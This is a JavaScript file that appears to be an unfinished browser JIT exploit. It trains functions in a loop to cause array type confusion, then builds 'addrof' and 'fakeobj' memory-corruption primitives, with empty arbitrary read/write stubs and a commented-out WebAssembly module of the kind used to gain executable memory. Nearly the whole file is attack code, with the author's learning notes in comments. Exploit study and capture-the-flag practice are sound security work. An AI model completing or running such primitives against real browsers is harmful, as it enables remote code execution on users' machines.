var buf = new ArrayBuffer(8);
var u64_buf = new Uint32Array(buf);
var f64_buf = new Float64Array(buf);

function hex(val) {
	return ftoi(val).toString(16)
}

function itof(val) {
	u64_buf[0] = Number(val & 0xffffffffn);
	u64_buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

function ftoi(val) {
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

// Prints out a double value in hex
function hex(val) {
    return "0x" + ftoi(val).toString(16)
}

// It is important to note that reading out the last element in the array will happen as though we were reading from a double array. This is because of the JIT optimizations. This means we would actually be reading a 64 bit / 8 byte value as opposed to 4 bytes. This is because when we read a value from a double array, we read 8 bytes. When we read a value from an object array, however, we only read 4 bytes
// Question: Why am I able to do this even without using idx = -1?
function read_bug(arr, idx) {
   
    ret = 0;
    for (var i = 0; i < 100; i++) {
        ret ++;
    }
    return arr[idx]

}

function write_bug(arr, idx, val) {
    
    ret = 0;
    for (var i = 0; i < 100; i++) {
        ret ++;
    }
    arr[idx] = val
    return
}

// Creates an addrof primitive
// Do this by placing object into the array
// Get the address of the object
function addrof(arr, obj) {
    arr[1] = obj
    // will look like obj[1]obj[0]
    console.log(hex(read_bug(arr,0)))
    int_addr = ftoi(read_bug(arr,0))
    addr = (BigInt(int_addr) & (0xffffffffn << 32n)) >> 32n
    return itof(addr)
}

// Because we have essentially "trained" the JIT to do a double write, 
// we can write some memory address to this object array
// Just gonna write the object to both places in the index
// value is int
// Able to write some values but not sure why objarr[0] is not what is expected
function fakeobj(arr, idx, value) {
    to_write = BigInt(value) + (BigInt(value) << 32n)
    console.log("fakeobj hex is: ", hex(itof(to_write)))
    float_addr = itof(to_write)
    console.log(hex(float_addr))
    write_bug(arr, idx, float_addr)
    return
}

// Have to do a fakeobj with the leaked address
function arb_read() {
     
}

// Write to the leaked address
function arb_write() {

}

function test(obj_arr) {
    // Testing addrof
    new_obj = {"c":"d"}
    addr = addrof(obj_arr, new_obj)
    console.log("Address is: ", hex(addr), addr)
}

function exploit() {
    
    dbl_arr = [2.1, 2.1]
    obj_arr = [{"hi":1}, {"wor":2}]
    for (var i = 0; i < 100000; i++) {
        // will this get optimized out since the value isnt' used?
        read_bug(dbl_arr, 1);
        write_bug(dbl_arr, 1, 2.3);
    }

    new_obj = {"c": "d"}
    addr = addrof(obj_arr, new_obj)
    console.log(hex(addr))

    fakeobj(obj_arr, 0, ftoi(addr))

    // wasm code 
    /*
    var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasm_mod = new WebAssembly.Module(wasm_code)
    var wasm_instance = new WebAssembly.Instance(wasm_mod)
    var f = wasm_instance.exports.main
    */
    

    // Checking if this did or did not deoptimize

}

exploit()
